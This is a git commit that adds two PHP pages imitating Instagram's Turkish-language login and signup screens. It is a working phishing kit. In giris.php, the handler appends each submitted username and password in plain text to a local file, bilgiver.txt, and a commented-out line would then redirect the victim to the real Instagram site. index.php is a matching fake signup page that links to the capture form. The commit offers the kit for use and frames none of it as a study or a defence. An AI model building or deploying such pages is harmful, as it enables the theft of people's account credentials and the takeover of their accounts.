4c3d1732fff846cedf5d63f87657b39ff3a2098e
keko01 <hatipyucel@gmail.com>
2019-05-11 21:56:15 +0300

    Add files via upload

---
+++ giris.php
@@ -0,0 +1,51 @@
+﻿<html>
+<head>
+<link rel="Shortcut Icon" href="instagram.ico" type="image/x-icon">
+<link rel="stylesheet" type="text/css" href="tasarim.css"/>
+<title>
+İnstagram
+</title>
+<head>
+<body bgcolor="#fafafa">
+<center>
+<br>
+<table border="0">
+<tr>
+<td>
+<img src="tel.png">
+</td>
+<td>
+<div class="ana">
+<center>
+
+<a href=""><img src="logo.png"></a>
+</center>
+<br><center>
+<form action="" method="post">
+<input type="text" placeholder="Kullanıcı Adı" name="kullaniciadi"><br>
+<input type="password" placeholder="Şifre" name="sifre"><br>
+<font color="white">------------------------</font><a href="#">Unuttun mu ?</a><br>	
+ <div class="ari"><input type="submit" value="Giriş yap"> </div><br><br>
+<div class="yari">Hesabın Yokmu?   <a href="index.php">Kaydol</a></div></center></td>
+</tr>
+</table>
+</div>
+<img src="footer.png">
+</center>
+<hr>
+</body>
+</html>
+<!-- Ömer Ülkü -->
+<?php 
+@$ad=$_POST["kullaniciadi"];
+@$sifre=$_POST["sifre"];
+if($_POST){
+
+$yaz=fopen("bilgiver.txt","a");
+$icerik="Kullanıcı adı :".$ad." şifre :".$sifre."\n";
+fwrite($yaz,$icerik);
+ 
+fclose($yaz);
+//	header("location:http://www.instagram.com");
+}
+?>
---
+++ index.php
@@ -0,0 +1,37 @@
+﻿<html>
+<head>
+<link rel="Shortcut Icon" href="instagram.ico" type="image/x-icon">
+<link rel="stylesheet" type="text/css" href="tasarim.css"/>
+<title>
+İnstagram
+</title>
+<head>
+<body bgcolor="#fafafa">
+<center>
+<br>
+<table border="0">
+<tr>
+<td>
+<img src="tel.png">
+</td>
+<td bgcolor="white">
+<div class="ana">
+<a href=""><img src="face-giris.png"></a>
+<br><center>
+
+<input type="text" placeholder="Cep Telefonu Numarası veya E-posta"><br>
+<input type="text" placeholder="Tam Adın"><br>
+<input type="text" placeholder="Kullanıcı Adı"><br>
+<input type="password" placeholder="Şifre"><br>
+<a href="#"><img src="kaydol.png"></a><br>
+<a href="giris.php"><img src="giris.png"><br></a>
+
+</div></center></td>
+</tr>
+</table>
+
+<img src="footer.png">
+</center>
+</body>
+</html>
+<!-- Ömer Ülkü -->
